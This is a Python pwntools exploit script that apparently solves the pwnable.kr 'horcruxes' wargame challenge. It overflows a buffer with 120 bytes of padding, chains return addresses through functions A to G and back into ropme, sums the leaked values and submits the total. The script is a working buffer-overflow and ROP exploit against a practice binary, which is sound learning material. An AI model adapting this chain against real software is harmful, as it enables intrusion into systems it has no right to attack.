from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('./horcruxes')

# p = process('./horcruxes')
p = remote('pwnable.kr', '9032')
pause()

call_ropme = 0x0809fffc

payload = flat(
    b'a' * 120,
    elf.sym['A'],
    elf.sym['B'],
    elf.sym['C'],
    elf.sym['D'],
    elf.sym['E'],
    elf.sym['F'],
    elf.sym['G'],
    call_ropme
)
p.sendlineafter(b'Menu:', b'1')
p.sendlineafter(b'earned? : ', payload)

all_sum = 0
for i in range(7):
    p.recvuntil(b'EXP +')
    all_sum += int(p.recvuntil(b')', drop=True))
all_sum = u32(p32(all_sum % (2 ** 32)), signed='signed')

p.sendlineafter(b'Menu:', b'1')
p.sendlineafter(b'earned? : ', str(all_sum).encode())

p.interactive()